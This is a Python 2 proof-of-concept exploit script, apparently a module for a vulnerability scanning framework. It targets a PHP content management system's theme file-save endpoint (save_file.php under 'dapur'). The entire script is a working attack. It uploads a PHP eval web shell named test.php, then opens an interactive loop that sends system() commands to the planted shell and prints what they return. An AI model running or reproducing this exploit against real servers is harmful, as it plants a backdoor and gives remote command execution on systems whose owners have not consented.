import re
import urlparse

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("dapur/apps/app_theme/libs/save_file.php"):
            print(
                "[*] Please make sure the url end with 'dapur/apps/app_theme/libs/save_file.php'"
            )
            exit()

        password = raw_input("[*] Please enter the shell-password:")
        phpShell = "<?php eval($_POST['" + password + "']);?>"
        shellName = "test.php"
        postData = {'content': phpShell, 'src': shellName}
        r = requests.post(target.url, data=postData)

        shell = target.url.replace("save_file.php", shellName)

        while 1:
            try:
                command = raw_input("[*] input the command:")
                payload = 'system("%s");' % command
                if command != "exit":
                    postData = {password: payload}
                    r = requests.post(shell, data=postData)
                    print(r.text.encode(r.encoding))
                else:
                    break
            except EOFError as e:
                print("[*] type 'exit' to quit")
                pass

    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
